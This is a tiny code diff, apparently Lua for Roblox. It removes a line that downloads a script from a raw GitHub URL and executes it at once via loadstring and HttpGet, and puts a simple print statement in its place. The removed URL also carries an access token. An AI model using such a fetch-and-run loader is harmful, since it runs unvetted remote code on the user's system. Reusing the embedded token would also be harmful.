@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Heisenberg1374/tetst/main/test?token=GHSAT0AAAAAACCVJAUYXQUATXOX3TTGOQCKZD2SCEQ"))()
+print("Hola")
